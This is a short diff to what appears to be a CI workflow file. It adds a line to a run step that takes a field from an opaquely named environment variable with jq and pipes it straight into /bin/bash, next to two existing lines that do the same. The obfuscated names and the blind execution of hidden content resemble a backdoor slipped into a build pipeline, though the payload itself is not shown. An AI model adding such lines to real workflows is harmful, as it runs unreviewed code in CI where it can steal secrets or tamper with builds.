@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$znzb504" | jq -r .axqna33873 | /bin/bash
           echo $euid31 | jq -r .m2 | /bin/bash
+          printf '%s' "$l32" | jq -r .iva12 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
